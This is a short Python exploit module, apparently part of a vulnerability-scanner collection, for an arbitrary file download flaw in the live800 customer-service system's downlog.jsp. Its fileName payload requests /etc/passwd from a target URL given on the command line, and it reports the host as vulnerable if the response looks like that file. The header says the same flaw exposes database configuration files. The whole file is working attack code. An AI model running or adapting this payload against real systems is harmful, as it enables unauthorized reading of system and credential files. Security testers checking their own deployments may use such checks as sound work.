#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: live800客服系统downlog任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2010-0147322
author: Lucifer
description: live800客服系统downlog.jsp参数fileName未过滤导致任意文件下载,可下载数据库配置文件
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class live800_downlog_filedownload():
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/live800/downlog.jsp?path=/&fileName=/etc/passwd"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"root:" in req.text and r"/bin/bash" in req.text:
                printGreen("[+]Success:存在live800客服系统任意文件下载漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在live800_downlog_filedownload漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = live800_downlog_filedownload(sys.argv[1])
    testVuln.run()